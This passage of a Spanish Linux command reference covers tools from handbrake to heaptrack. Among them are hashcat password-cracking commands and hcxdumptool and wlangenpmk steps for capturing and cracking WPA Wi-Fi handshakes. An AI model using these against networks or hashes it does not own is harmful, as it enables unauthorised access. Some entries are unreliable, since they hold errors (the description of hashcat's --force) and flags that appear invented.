$ halt --reboot (Reiniciar la máquina, independientemente de cuál de los tres comandos se invoque)


handbrake
Herramienta para convertir DVD y otros vídeos a formatos H.264, XViD u Ogg. Es especialmente útil para crear vídeos compatibles con dispositivos portátiles como el iPod/iPhone de Apple o la PSP de Sony.
$ HandBrakeCLI -i entrada.avi -o salida.mp4 (convertir un archivo de vídeo a MP4, por defecto usa H.264)
$ HandBrakeCLI -i entrada.mkv -o salida.mp4 --preset "Fast 1080p30" (convertir con un ajuste preestablecido, por ejemplo "Fast 1080p30")
$ HandBrakeCLI --preset-list (consultar los presets disponibles)
$ HandBrakeCLI -i /dev/dvd -o salida.mp4 --title 1 --preset "Very Fast 720p30" (extraer el contenido de un DVD)
$ HandBrakeCLI -i entrada.mkv -o salida.mp4 -E av_aac (convertir vídeo y cambiar el codec de audio [copy, vorbis, mp3])
$ HandBrakeCLI -i entrada.mkv -o salida.mp4 --subtitle 1 --subtitle-burned (convertir y añadir subtítulos)
$ HandBrakeCLI -i entrada.mkv -o salida.mp4 --crop 0:0:10:10 --width 1280 --height 720 (redimensionar o recortar el vídeo)
        --crop --> recorta píxeles del vídeo, arriba\:abajo\:izquierda\:derecha y --width y --height --> cambia la resolución.
$ HandBrakeCLI -i /dev/dvd --title 0 --scan (analizar DVDs. Lista todos los títulos del DVD y sus detalles como duración, capítulos, etc.)


handlebars
Motor de plantillas semánticas que permite crear plantillas reutilizables con sintaxis similar a HTML pero con capacidades de lógica y renderizado dinámico.
$ handlebars plantilla.handlebars -f plantilla.compiled.js (precompilar plantilla)
Luego se puede incluir el archivo compilado en el HTML:
        <script src="plantilla.compiled.js"></script>


haproxy-cmd
Contiene un asistente para enviar comandos a través del socket de haproxy, lo que permite mantener los servidores de un clúster mediante el vaciado, la habilitación y la detención de servidores de un backend. Ofrece persistencia de conexión mediante cookies HTTP, balanceo de carga, adición, modificación y eliminación de encabezados en ambos sentidos. Tiene funciones de bloqueo de solicitudes y proporciona una interfaz para visualizar el estado del servidor.
$ haproxy-cmd list (listar backends y servidores disponibles con su estado actual: UP/DOWN, peso, etc.)
$ haproxy-cmd disable web_backend server1 (deshabilitar un servidor en un backend)
$ haproxy-cmd enable web_backend server1 (habilitar un servidor)
$ haproxy-cmd drain web_backend server1 (permite que las conexiones existentes terminen, pero no acepta nuevas)
$ haproxy-cmd maint web_backend server1 (fuerza el modo de mantenimiento, ignorando checks)
$ haproxy-cmd set weight web_backend server1 50 (cambia el peso de server1 a 50)
$ haproxy-cmd stats (mostrar estadísticas: número de conexiones activas, tráfico procesado, estados de los servidores...)
Configuración previa necesaria
# nano /etc/haproxy/haproxy.cfg
Y añadir:
        global
            stats socket /run/haproxy/admin.sock mode 660 level admin
# systemctl restart haproxy (reiniciar HAProxy)


harden-doc
Documentación útil para proteger un sistema Debian. Este paquete contiene documentación que un administrador puede usar para aumentar la seguridad de un sistema Debian. Actualmente proporciona el "Manual de Seguridad de Debian" del Proyecto de Documentación de Debian. El manual está disponible tanto en inglés como en todas las traducciones disponibles, incluyendo portugués brasileño, chino, francés, alemán, italiano, japonés y español. Las traducciones no están actualizadas.
file:///usr/share/doc/harden-doc/html/es-ES/index.html


hardening-runtime
Este paquete instala configuraciones diseñados para mejorar el refuerzo de una instalación predeterminada de Debian que se encargan de ajustar parámetros del kernel y del sistema en general aplicando configuraciones recomendadas por el proyecto de autoprotección del kernel de Linux, con el objetivo de reducir la superficie de ataque y mitigar posibles exploits. Incluye archivos de configuración [.conf] en directorios como /etc/sysctl.d/ que establecen valores más seguros. Algunas opciones tienen efectos secundarios en el rendimiento o la usabilidad. Se recomienda a los usuarios ajustar los archivos de configuración según el archivo README.Debian para que se ajusten a su sistema.
Algunos ejemplos:
1.-
Desactivar opciones del kernel que pueden ser explotadas
kernel.dmesg_restrict podría estar en 0, permitiendo a usuarios no privilegiados leer el buffer del kernel [dmesg], lo que podría revelar información sensible sobre vulnerabilidades o direcciones de memoria. Con hardening-runtime Es probable que hardening-runtime configure kernel.dmesg_restrict = 1 [los usuarios no root no podrían leer el buffer de dmesg]
$ sysctl kernel.dmesg_restrict
2.-
El sistema de archivos /proc puede exponer más información de la necesaria.
El paquete lo pone en valores 1 [Los punteros de kernel expuestos a usuarios sin privilegios se ocultan] o 2 [Todos los punteros de kernel son ocultados, incluso para usuarios con privilegios]. 0 es el valor predeterminado [la dirección se procesa antes de imprimirse].
$ sysctl kernel.kptr_restrict
3.-
Prevenir ciertos tipos de ataques, como ataques SYN-flood o enrutamiento.
Algunas configuraciones por defecto podrían ser demasiado permisivas y el paquete podría ser configurar en 1 para mitigar ataques SYN-flood.
$ sysctl net.ipv4.tcp_syncookies
Lo que ayuda a proteger el sistema contra ataques de denegación de servicio (DoS) que explotan la pila TCP/IP.


hardlink
Herramienta que detecta archivos iguales y los reemplaza con enlaces duros.
# hardlink -f -x /videos -t -o /home/usuaario (Enlazar archivos con el mismo nombre [f], excluyendo el directorio "videos" [x], comprobando aunque la fecha de modficación sea diferente [t], ignorando el propietario [o] y sobre la carpeta personal)
# hardlink -n /home/usuario (Hacer una simulación)


haroopad
Procesador de textos en markdown que al dividir la pantalla en dos, permite visualizar el resultado directamente. Descargar de github <https://github.com/rhiokim/haroopad>
$ haroopad -f archivo.md
$ haroopad --mode view archivo.md (Abrir el archivo sólo en modo lectura)
$ haroopad --mode edit archivo.md (Abrir el archivo sólo en modo edición)


harp
[Harmonization and Analysis of Remote-sensing data for intercomparison and validation]. El objetivo principal es preprocesar y armonizar datos geofísicos, como observaciones satelitales, datos de modelos, mediciones in-situ, etc, con el objetivo de facilitar su comparación. Incluye las herramientas harpcheck, harpcollocate, harpconvert, harpdump y harpmerge
$ harpcheck data.nc (verifica archivos HARP para asegurarse de que cumplan con las especificaciones)
$ harpcollocate -a 'bin_spatial(1, 0, 1);bin("latitude", 0.5, 0.5, 1)' sat.nc ground.nc output_collocated.nc (compara espacialmente los datos de sat.nc, por ejemplo, satélite y ground.nc, por ejemplo, datos en tierra, y produce un archivo collocated.nc)
$ harpcollocate sat.nc ground.nc collocated.nc (colocalizar ambos conjuntos)
$ harpconvert -a 'latitude > 0 [degree_north]; keep(latitude, longitude, ozone_column)' input.nc output_filtered.nc (filtra los datos para incluir solo los del hemisferio norte y conserva solo ciertas variables)
$ harpconvert -a 'derive(latitude {latitude}); derive(longitude {longitude})' raw_satellite.hdf sat.nc (convertir datos satelitales al formato HARP)
$ harpdump data.nc (imprime información de dimensiones, variables, atributos y algunas estadísticas)
$ harpmerge file1.nc file2.nc file3.nc merged.nc (crea un archivo merged.nc que contiene los datos combinados de todos los archivos de entrada.)


hasciicam
Visualizar la webcam via ascii.
$ hasciicam -m html -c 50 -o (En modo html, contraste 50 [de 0 a 100. Por defecto 4] y guardar el archivo)
Otras opciones:
-i /dev/xxxx (Especificando dispositivo.Por defecto /dev/video)
-o archivo (Guardar imagen en archivo. Se reescribe según el parámetro -r. Si no se especifica salida, por defecto es hasciicam.html [para html] y hasciicam.txt [para txt])
-r 1 (Refrescar imagen cada 1 segundo. Por defecto 2. No afecta al modo live)


hash
Lista de los últimos comandos usados.
$ hash
$ hash -l
$ hash -d date (borrar la entrada date del listado)
$ hash -r (borrar todo el listado)


hash-identifier
Se le especifica un hash y la herramienta lo estudia y muestra el tipo más probable que podría ser [Possible Hashs] y los menos probables [Least Possible Hashs]. Descarga: <https://code.google.com/p/hash-identifier/downloads/list>
$ python Hash_ID_v1.1.py
Cuando sale el promt pastear el hash:
HASH: caf90169eefa5f807d577486b9f795ab86ae2983c5c20806cff959117e90af18
	Possible Hashs:
	[+]  SHA-256
	[+]  Haval-256
	Least Possible Hashs:
	[+]  GOST R 34.11-94
	[+]  RipeMD-256
	[+]  SNEFRU-256
	[+]  SHA-256(HMAC)
	[+]  Haval-256(HMAC)
	[+]  RipeMD-256(HMAC)
	[+]  SNEFRU-256(HMAC)
	[+]  SHA-256(md5($pass))
	[+]  SHA-256(sha1($pass))


hash-slinger
Herramientas para generar registros DNS especiales que permiten autenticar servicios mediante criptografía: sshfp genera registros DNS SSHFP RFC-4255, tlsa genera registros DNS TLSA RFC-6698 mediante TLS y openpgpkey genera registros DNS OPENPGPKEY RFC-<TBD>
$ ssh -o "VerifyHostKeyDNS=yes" usuario@servidor.example.com (configura el cliente SSH para verificar el servidor mediante DNS)
$ sshfp -a sha256 servidor.example.com (generar un registro SSHFP para SSH)
        servidor.example.com IN SSHFP 2 2 1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef
2 --> Algoritmo ECDSA, RSA sería 1.
2 --> Tipo de hash SHA-256, SHA-1 sería 1.
El hash es la huella de la clave pública del servidor SSH, generalmente en /etc/ssh/ssh_host_ecdsa_key.pub.
$ tlsa --port 443 --protocol tcp --certificate /ruta/al/certificado.pem mi-servidor.example.com (generar un registro TLSA para HTTPS/DANE)
        _443._tcp.mi-servidor.example.com IN TLSA 3 1 1 abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890
3 --> Uso, DANE-EE: certificado exacto.
1 --> Selector, certificado completo.
1 ..> Tipo de hash, SHA-256.
$ openpgpkey --user usuario@example.com --key /ruta/a/mi-clave.pub (generar un registro OPENPGPKEY para correo)


hashcat
herramienta de recuperación de contraseñas utilizada para realizar ataques de fuerza bruta sobre hashes.
$ hashcat -a 3 -m 0 hash.txt ?d?d?d?d?d ("a 3" que se realizará un ataque de fuerza bruta a un hash MD5 "m 0", con contraseñas numéricas de 5 dígitos "?d?d?d?d?d")
$ hashcat -a 0 -m 1400 hash.txt diccionario.txt ("a 0" que se hará un ataque de diccionario a un hash SHA-256 "m 1400". diccionario.txt contiene las posibles contraseña)
$ hashcat -a 3 -m 0 hash.txt ?1?1?1?1?1?1?1 (combinando mayúsculas, minúsculas y números. "?1" define un conjunto de caracteres a utilizar)
$ hashcat -a 0 -m 0 hash.txt diccionario.txt --force (recuperar contraseña con "force" permite a hashcat usar la GPU)


hashdeep
Conjunto de herramientas diseñado para calcular y verificar hashes criptográficos [MD5, SHA1, SHA256, Tiger y Whirlpool] de archivos de forma recursiva. Incluye las herramientas md5deep, sha1deep, sha256deep, tigerdeep y whirlpooldeep cada una optimizada para un algoritmo de hash particular
$ sha256deep -r /ruta/al/directorio (calcular hashes SHA-256 de un directorio y subdirectorios)
$ sha256deep -rl /ruta/al/directorio > hashes_originales.txt (guardar hashes en un archivo para auditorías futuras. "l" usa rutas relativas en lugar de absolutas)
$ sha256deep -rlX hashes_originales.txt /ruta/al/directorio (reportará los archivos modificados, exit code 1 o confirmará integridad, exit code 0)
$ hashdeep -c md5,sha1,sha256 -r /ruta/al/directorio (calcula tres hashes diferentes para cada archivo)
$ hashdeep -k hashes_conocidos.txt -a /ruta/a/auditar (compara los hashes actuales con una lista de referencia y muestra discrepancias)


hashalot
Entrar una frase y muestra su hash. Soporta: ripemd160, rmd160, rmd160compat, sha256, sha384 y sha512
$ hashalot -x sha256 (En binario [x])
	Enter passphrase:
	c9168d9f82c8d04dcaea564c9dfbdd4924b26cfec589e739fdac346af936a542
Nota.- la frase entrada y que no se muestra en el prompt es: linux es genial


hashid
Identificar diferentes tipos de hashes utilizados para cifrar datos y especialmente contraseñas. es una herramienta escrita en Python 3.x que admite la identificación de más de 175 tipos de hash únicos mediante expresiones regulares. Es capaz de identificar un único hash o analizar un archivo e identificar los hashes que contiene. También hay disponible una versión nodejs de hashID que se configura fácilmente para proporcionar identificación de hash en línea.
$ hashid -e caf90169eefa5f807d577486b9f795ab86ae2983c5c20806cff959117e90af18
$ hashid -m 89939edf840d6edd260dcf326eb71beed79f776d -o file (incluir el modo hashcat en la salida y guardarla en file)


hashrat
Herramienta para generar y verificar hashes criptográficos compatible con varios algoritmos [MD5, SHA1, SHA256, SHA512, y sus versiones HMAC] y permite la salida en varios formatos: octal, decimal, hexadecimal, hexadecimal en mayúsculas, o Base64, o en su propio formato. Su modo CGI es una característica interesante para integrarlo en aplicaciones web.
$ hashrat -a md5 -s "Hola mundo" (calcular el hash MD5 de una cadena de texto)
Los algoritmos disponibles incluyen: md5, sha1, sha256, sha512, hmac-md5, hmac-sha1, hmac-sha256 y hmac-sha512
$ hashrat -a sha256 documento.txt (mostrará el hash SHA256 del contenido del fichero)
$ hashrat -a sha512 -s "Mi contraseña secreta" -f base64 (calcular el hash SHA512 de una cadena y mostrarlo en Base649
Los formatos de salida disponibles son: octal, decimal, hex [por defecto, hexadecimal en minúsculas], HEX [hexadecimal en mayúsculas] y base64
$ hashrat -a hmac-sha256 -k "mi_clave_secreta" -s "Mensaje confidencial" (usar HMAC especificando el algoritmo HMAC y una clave)
$ hashrat -c hash_verificar.txt (verificar un hash)
$ cat /etc/passwd | hashrat -a sha1 (calculará el hash SHA1 del contenido del fichero)
Nota.- Si no se especifica un fichero, hashrat leerá la entrada estándar [stdin].


hashtag
Analiza e identifica varios hashes de contraseñas en función de su tipo. Descarga de <https://github.com/SmeegeSec/HashTag>
# hashtag -sh $1$MtCReiOj$zvOdxVzPtrQ.PXNW3hTHI0 (Analizar uno sólo)
# hashtag -f archivo (Analizar todos los hash contenidos en un archivo)
# hashtag -d dir -o archivo (recorrer un directorio y todos los subdirectorios intentando identificar todos los hash potenciales y mandando el resultado a un archivo. Si no se especifica, la salida es HashTag_Output_File.txt)


haveged
Demonio que genera entropía para el núcleo de Linux, mejorando la disponibilidad de números aleatorios en sistemas donde la fuente de entropía natural, como movimientos de ratón, pulsaciones de teclado o actividad de disco, es limitada. Utiliza el algoritmo HAVEGE [HArdware Volatile Entropy Gathering and Expansion] que no depende de los mecanismos estándar para recolectar aleatoriedad para el conjunto de entropía del sistema. Si el sistema no tiene suficiente entropía, procesos como gpg o ssh-keygen pueden bloquearse o volverse lentos.
# systemctl status haveged (ver el estado actual)
# systemctl enable haveged (habilitar para que se inicie automáticamente al arrancar el sistema)
# nano /etc/default/haveged
        DAEMON_ARGS="-w 2048"
$ cat /proc/sys/kernel/random/entropy_avail (verificar la cantidad de entropía disponible en el sistema)


hblock
Script de shell compatible con POSIX que obtiene una lista de dominios que publican anuncios, scripts de seguimiento y malware de múltiples fuentes y los añade al contenio del archivo /etc/hosts y así evita que el sistema se conecte a ellos. Cada dominio se asocia con la dirección IP 127.0.0.1, lo que significa que cualquier intento de acceder a esos dominios será redirigido a la máquina local, evitando así que el sistema se conecte a ellos. Aunque no modifica el contenido existente en /etc/hosts, siempre es preferible realizar una copia de seguridad. Descargar e instalar hblock:
# curl -o /usr/local/bin/hblock https://raw.githubusercontent.com/hectorm/hblock/v3.4.0/hblock
# chmod +x /usr/local/bin/hblock
$ hblock (descargar las listas de dominios y actualizará el archivo /etc/hosts para bloquearlos)
$ hblock -S none -D none (desactivar temporalmente hblock generando un archivo de hosts sin ningún dominio bloqueado)
Para mantener el sistema protegido, es recomendable ejecutar hblock periódicamente con crontab:
# crontab -e
Y añadir la linea:
0 2 * * * /usr/local/bin/hblock
Para ejecutar hblock diariamente a las 2 AM


hciconfig
Configuración de dispositivos bluetooth.
# hciconfig -a (Para saber cual es el dispositivo)
# hciconfig hci0 up (Levantar el dispositivo)
# hciconfig hci0 down (Parar el dispositivo)
# hciconfig hci0 revision (Información completa del dispositivo)
# hciconfig hci0 piscan  (activar visivilidad de la exploración)
# hciconfig hci0 noscan   (Desactivarla)
# hciconfig -h (Listado completo de comandos disponibles)


hcitool
Busqueda de disposivos bluetooth, siempre que no esten en modo oculto.
$ hcitool scan (Busca dispositivos activos)
$ hcitool info   (Muestra información de los dispositivos encontrados)


hcloud-cli
Interfaz oficial para interactuar con la API de Hetzner Cloud, que opera sobre HTTPS, utiliza JSON como formato de datos y sigue un diseño RESTful. Permite gestionar recursos como servidores, volúmenes, redes, IPs flotantes, claves SSH y más desde la terminal, facilitando la automatización y la administración eficiente de infraestructura en la nube.
Antes de usar hcloud, se necesita configurarlo con un token de API de Hetzner Cloud [https://console.hetzner.cloud]
$ hcloud context create my-project (crear un contexto ingresando el token cuando se solicite lo que activará el contexto para el proyecto)
$ hcloud --help (listar comandos disponibles)
$ hcloud server-type list (listar tipos de servidores disponibles)
$ hcloud server create --image ubuntu-22.04 --type cx11 --name my-cool-server (crea un servidor con la imagen ubuntu-22.04, tipo cx11 y nombre my-cool-server)
$ hcloud ssh-key create --name my-ssh-key --public-key "ssh-rsa AAAjjk76kgf...Xt" (subir la clave SSH habilita el acceso seguro al servidor sin contraseña)
$ hcloud server list -o json (muestra todos los servidores en el contexto activo y obtener resultados en formato JSON)
$ hcloud server describe my-cool-server (muestra información detallada de un servidor por su ID o nombre)
$ hcloud volume create --size 123 --name my-volume --server my-cool-server (crea un volumen de 123 GB y lo asócia a un servidor)
$ hcloud floating-ip create --type ipv4 --description "my-floating-ip" (crea una IP flotante)
$ hcloud floating-ip assign <floating-ip-id> my-cool-server (asigna la IP flotante a un servidor lo que permite redirigir tráfico sin cambiar la configuración del servidor)
$ hcloud floating-ip unassign <floating-ip-id> (desasigna la IP)
$ hcloud server delete my-cool-server (elimina un servidor por su ID o nombre de forma permanente)
$ hcloud server metrics my-cool-server --type cpu,disk (consulta métricas [CPU, disco, red] de un servidor)
$ hcloud context list (si se trabaja con varios contextos, muesta el listado)


hcxdumptool
Pequeña herramienta de auditoría de seguridad inalámbrica. Su función principal es capturar tráfico de redes Wi-Fi, especialmente los handshakes WPA/WPA2, para determinar si los puntos de acceso o clientes Wi-Fi son vulnerables a ataques de fuerza bruta.
# hcxdumptool -i wlan0 -o captura.pcapng (captura básica en una interfaz)
# hcxdumptool -i wlan0 -o captura.pcapng --filterlist=redes.txt (captura con lista ESSID de redes objetivo)
# hcxdumptool -i wlan0 -o captura.pcapng --enable_status=1 (captura activa enviando paquetes de autenticación)
# hcxdumptool -i wlan0 -o captura.pcapng -c 6 (captura en canal específico)


hcxkeys
[hcxtools hcxdumptool]  Herramientas para generar claves maestras simples [PMKs - PlainMasterKeys] a partir de la técnica de criptografía "Tablas Arcoíris" [Rainbow Tables] y hashes para su uso con las últimas versiones de Hashcat y John the Ripper. El paquete incluye dos binarios: wlangenpmk para cálculos de CPU y wlangenpmkocl para cálculos de GPU [han de instalarse los controladores OpenCL correspondientes al modelo de GPU]. Una "tabla arcoíris", en el contexto de la seguridad de contraseñas, se utiliza para encontrar la contraseña original, en texto plano a partir de su hash. Las herramientas hcx... incluyen los ejecutables: hcxdumptool, hcxpioff, wlangenpmk, wlangenpmkocl, hcxeiutool, hcxessidtool, hcxhash2cap, hcxhashcattool, hcxhashtool, hcxmactool, hcxpcapngtool, hcxpmkidtool, hcxpmktool, hcxpsktool, hcxwltool, whoismac y wlancap2wpasec.
$ wlangenpmk -e MiWiFi -i wordlist.txt -o pmklist.txt (generar PMKs usando la CPU)
        -e MiWiFi --> Especifica el ESSID de la red objetivo.
        -i wordlist.txt --> La ruta al archivo de lista de palabras [una en cada línea].
        -o pmklist.txt --> El archivo de salida donde se guardarán las PMKs generadas.
$ wlangenpmkocl -e MiWiFi -i wordlist.txt -o pmklist.txt (generar PMKs usando la GPU si se tiene una compatible con OpenCL)
$ hcxpcapngtool -o my_hashes.hc22000 --pmkid-eapol=my_capture.pcapng (archivo de salida para los hashes en formato Hashcat [modo 22000] y especificando extraer PMKIDs y EAPOL de la captura)
1.-
Captura el handshake y convertirlo a formato hashcat mostrando el estado del proceso.
# hcxdumptool -o my_capture.pcapng --enable_status_led
# hcxdumptool -i wlan0mon -o my_capture.pcapng --enable_status_led
Luego, generar PMKs y enviarlas directamente a Hashcat
$ cat wordlist.txt | wlangenpmk -e MiWiFi | hashcat -m 22000 my_hashes.hc22000
        cat wordlist.txt --> Envía el contenido del archivo wordlist.txt a la entrada estándar de wlangenpmk.
        wlangenpmk -e MiWiFi --> Genera las PMKs para "MiWiFi" a partir de la lista de palabras recibida por la entrada estándar y las envía a la salida estándar.
        hashcat -m 22000 my_hashes.hc22000 --> Hashcat recibe las PMKs de la salida estándar de wlangenpmk y las compara con los hashes de los handshakes [modo 22000 es para WPA-PMK].


hd-idle
Utilidad que permite apagar o detener la rotación de discos duros externos, especialmente aquellos conectados vía USB o FireWire, después de un período de inactividad, con el fin de ahorrar energía y reducir el desgaste del disco.
# hd-idle -i 10 -a /dev/sdb (detener /dev/sdb después de 10 minutos de inactividad)
# hd-idle -i 5 -a /dev/sdb -i 15 -a /dev/sdc (detener varios discos con diferentes tiempos)
# hd-idle -i 20 (aplica un tiempo de 20 minutos a todos los discos detectados por el sistema)
# hdparm -C /dev/sdb (verificar si el disco ha sido detenido)
1.-
Que se inicie automáticamente al arrancar
# nano /etc/default/hd-idle
Cambia la línea:
        HD_IDLE_OPTS="-i 10 -a /dev/sdb"
# systemctl restart hd-idle (reiniciar el servicio)


hdav
Cliente WebDAV que, actualmente, solo permite copiar un archivo y sus propiedades WebDAV asociadas de una URL a otra.
$ hdav copy https://source.com/doc.pdf https://target.org/doc_copia.pdf --source-username USERNAME --source-password PASSWORD --target-username USERNAME --target-password PASSWORD
Comandos disponibles:
        copy --> Copiar propiedades y datos de una ubicación a otra
        delete --> Eliminar propiedades y datos
        getprops --> Obtener propiedades y mostrarlas en la salida estándar
        makecollection --> Crear una nueva colección
        move --> Mover propiedades y datos de una ubicación a otra en el mismo espacio DAV
        put --> Transferir archivo a URL
        caldav-report --> Obtener informe CalDAV


hddemux
Herramienta diseñada para demultiplexar conexiones entrantes [HTTP/1.x y DNS], es decir, inspecciona la primera parte de una conexión entrante para decidir a qué backend redirigirla. Esto es útil cuando se tiene un único puerto expuesto, por ejemplo 443, que puede recibir tanto tráfico HTTPS como tráfico DoT, y se necesita reenviarlo al backend adecuado según el protocolo detectado. Inspecciona la firma inicial, si parece una solicitud HTTP [GET, POST, etc.], reenvía al backend HTTP y si parece una conexión TLS DNS, basada en handshake o patrón, reenvía al backend DNS sobre TLS.
Supongamos que queremos aceptar conexiones HTTPS y conexiones DNS sobre TLS en el mismo puerto 443. Un servidor web HTTPS escuchando en localhost:8443 y un servidor DNS sobre TLS [como stubby, unbound, dnsdist, etc.] escuchando en localhost:853
$ hddemux -listen :443 -http 127.0.0.1:8443 -dot 127.0.0.1:853 (enrutar de forma inteligente ambas conexiones)


hddtemp
Indica la temperatura del disco especificado
# hddtemp /dev/sda
# hddtemp -d /dev/sda (arrancar el daemon)


hdfs-cli
Heramienta escrita en Go para interactuar con sistemas de archivos HDFS [Hadoop Distributed File System - Sistema de archivos distribuido para Big Data], que es un sistema de almacenamiento distribuido utilizado en el ecosistema de Apache Hadoop.
$ hdfs-cli ls /user/hadoop/datos (listar archivos en HDFS)
$ hdfs-cli put datos.csv /user/hadoop/entrada/ (copiar un archivo local a HDFS)
$ hdfs-cli get /user/hadoop/salida/resultado.csv . (descargar un archivo de HDFS a local)
$ hdfs-cli mkdir /user/hadoop/nuevo_dir (crear un directorio en HDFS)
$ hdfs-cli rm /user/hadoop/datos/basura.log (eliminar un archivo en HDFS)
$ hdfs-cli cat /user/hadoop/logs/sistema.log (ver el contenido de un archivo en HDFS)


hdhomerun-config
Herramienta para gestionar dispositivos HDHomeRun de SiliconDust, que son sintonizadores de TV digital conectados a la red y que permite descubrir su ubicación y nombre, obtener su configuración, realizar escaneos y actualizar su firmware.
$ hdhomerun_config discover (descubrir todos los dispositivos HDHomeRun en la red)
$ hdhomerun_config ID get /sys/model (obtener información detallada de un dispositivo específico)
$ hdhomerun_config ID get /sys/version (verificar versión actual del firmware)
$ hdhomerun_config ID get /tuner0/status (ver el estado actual de un sintonizador)
$ hdhomerun_config ID set /tuner0/channel 8vsb:177.028 (sintonizar un canal específico)
$ hdhomerun_config ID set /tuner0/program 1 (lo mismo)
$ hdhomerun_config ID get /tuner0/streaminfo (ver la señal del canal sintonizado)
$ hdhomerun_config ID scan /tuner0 (realizar un escaneo completo de canales)
$ hdhomerun_config ID scan /tuner0 8vsb:177.028 (escanear un canal específico)
$ hdhomerun_config ID set /sys/ip 192.168.1.100 (tres pasos para configurar dirección IP estática)
$ hdhomerun_config ID set /sys/subnet 255.255.255.0
$ hdhomerun_config ID set /sys/gateway 192.168.1.1
$ hdhomerun_config ID set /sys/ip none (volver a DHCP)
$ hdhomerun_config ID upgrade (actualizar firmware)
$ hdhomerun_config ID get /sys/hwmodel (obtener información general del sistema)
$ hdhomerun_config ID get /sys/features (lo mismo)
$ hdhomerun_config ID get /sys/restart (lo mismo)
$ hdhomerun_config ID get /sys/temperature (ver temperatura del dispositivo)
Nota.- Los formatos de canal varían según la región, 8vsb para ATSC en América del Norte, dvbt para DVB-T en Europa


hdmi2usb-fx2-firmware
Firmware del chip FX2 [Cypress FX2LP] que se encuentra en los dispositivos HDMI2USB, diseñados para capturar señales HDMI, como las de una cámara o computadora y convertirlas en una señal USB que puede ser reconocida como una cámara web [UVC] o dispositivo de captura por una computadora. Este paquete contiene el firmware FX2 para varios modos de la interfaz USB de la placa Numato Opsis.
$ hdmi2usb-fx2-firmware --list-devices (listar dispositivos disponibles)
$ hdmi2usb-fx2-firmware --load-firmware firmware.hex (cargar firmware en RAM [modo temporal, desaparece al reiniciar])
$ hdmi2usb-fx2-firmware --flash-firmware firmware.hex (grabar el firmware en EEPROM [modo permanente] reemplazando el firmware anterior)
$ hdmi2usb-fx2-firmware --reset (resetear el dispositivo después de cargar firmware)
Nota.- Se puede descargar el firmware desde https://github.com/timvideos/HDMI2USB-fx2-firmware/releases.


hdmi2usb-mode-switch
Esta herramienta permite flashear y configurar dispositivos HDMI2USB. Es un proyecto para capturar vídeo HDMI con una placa FPGA compatible con las placas Digilent Atlys y Numato Opsis.
$ hdmi2usb-mode-switch --list (listar los modos disponibles para un dispositivo conectado)
$ hdmi2usb-mode-switch --mode hdmi2usb (cambiar al modo HDMI2USB, modo captura de video)
$ hdmi2usb-mode-switch --mode dfu (cambiar al modo firmware update)


hdmi2usb-udev
Proporciona un conjunto de archivos de reglas udev [ver] a los dispositivos HDMI2USB, para su integración con el sistema operativo y que son usados por OBS, ffmpeg, vlc, o cualquier app compatible con /dev/video y por tanto no es un comando ejecutable como tal. Se instalan en /lib/udev/rules.d/70-hdmi2usb-udev.rules o /etc/udev/rules.d/99-hdmi2usb.rules


hdparm
consultar y modificar diferentes parámetros de los discos duros.
# hdparm /dev/sda (Informa del estado [activado o no] de las opciones de hdparm)
# hdparm -tT /dev/sda (Comprobar velocidad de lectura)
# hdparm -i /dev/sda (Informa de las características del disco duro)
# hdparm --sanitize-status (información del estado de desinfección)
# hdparm -D /dev/sda  (muestra desperfectos posibles)
1.-
Desactivación del APM (Gestión avanzada de energia) de los portatiles ya que esta tecnologia alarga la duración de la batería en detrimento de la vida útil del disco duro.
# hdparm -x /dev/sda
El parámetro que indica si tenemos APM y la frecuencia de ciclo de carga-descarga es:
Advanced power management level: 128
# hdparm -B 254 /dev/sda (Disminuir la frecuencia de los ciclos a mínimo. El valor máximo sería 1 y desactivado 255)
2.-
Minimizar el ruido del disco duro:
# hdparm -I /dev/sda | grep acoustic
Muestra el valor recomendado y el valor actual. Si vemos que el recomendado es menor que el valor actual podemos modificarlo con:
# hdparm -M (VALOR RECOMENDADO) /dev/sda


hdup
[Hard disk Duplication Utility]. Herramienta para duplicar sistemas de archivos completos, realizar copias de seguridad de sistemas operativos y crear imágenes de particiones o discos enteros.
# hdup /dev/sda /dev/sdb (duplicar un disco duro completo)
# hdup /dev/sda1 /dev/sdb1 (duplicar solo una partición)
# hdup /path/to/image.img /dev/sdX (duplicar un archivo o imagen de disco)
# hdup --info /dev/sdb (mostrar información sobre el dispositivo destino)
# hdup --verify /dev/sdb (verificar la integridad de la copia)
# hdup -c gzip /dev/sda /dev/sdb (duplicar con compresión)


head
muestra por defecto las primeras 10 lineas de un archivo si no se especifica cantidad.
$ head /var/log/apache2/access.log
$ head -50 /var/log/maillog  (las primeras 50)
$ head -5 archivo1 archivo2 (Muestra las 5 primeras lineas de los dos archivos)


headache
Herramienta para administrar las notas de licencia de los archivos de origen que generalmente se encuentra en un comentario al comienzo de estos archivos.
$ headache -c LICENSE_HEADER *.py (añade el contenido de LICENSE_HEADER al inicio de todos los archivos .py del directorio)
$ headache -r *.py (eliminar el encabezado de licencia existente)
$ headache -u LICENSE_HEADER *.py (actualizar el encabezado de licencia)


health-check
Herramienta que monitoriza procesos y, opcionalmente, sus procesos secundarios e hilos durante un tiempo determinado. Al finalizar la monitorización, mostrará un informe detallado sobre el uso de CPU, eventos de activación y operaciones de entrada/salida [E/S]. Puede utilizarse para diagnosticar procesos defectuosos, procesos que consumen demasiados recursos, cuellos de botella del sistema...
$ health-check -p 5678 -t 60 (monitorizar un proceso existente por su PID durante 60 segundos)
$ health-check -t 300 -- gzip large_file.tar.gz (monitorizar el proceso de compresión de un archivo grande con gzip durante 300 segundos)
$ health-check -p 5678 -t 120 -r (monitorizar el PID 5678 y todos sus procesos secundarios durante 120 segundos)
$ health-check -p emacs -t 10  (monitorear 10 segundos [por defecto 60] el proceso emacs)


heaptrack
Herramienta de perfilado de memoria que se utiliza para rastrear y analizar el uso de la memoria heap en aplicaciones. Funciona mediante la interceptación de llamadas a funciones de asignación de memoria, como malloc, free, realloc, etc. utilizando la variable de entorno LD_PRELOAD. Es útil para depurar fugas y aumentos de memoria. La memoria Heap se refiere a una región de la memoria de una computadora utilizada para la asignación de memoria dinámica. A diferencia de la memoria de la pila, que tiene un tamaño fijo y sigue un orden de primera entrada [LIFO], la memoria Heap permite una asignación más flexible y la distribución de bloques de memoria durante el tiempo de ejecución.
$ heaptrack ./programa (generará un archivo de datos con extensión .heaptrack que contiene la información de perfilado de memoria)
$ heaptrack_gui programa.heaptrack (analizar el archivo generado utilizando la herramienta gráfica de Heaptrack)
$ heaptrack python3 script.py (perfilar un script de Python)
$ heaptrack ./programa arg1 arg2 (perfilado de una aplicación con argumentos)
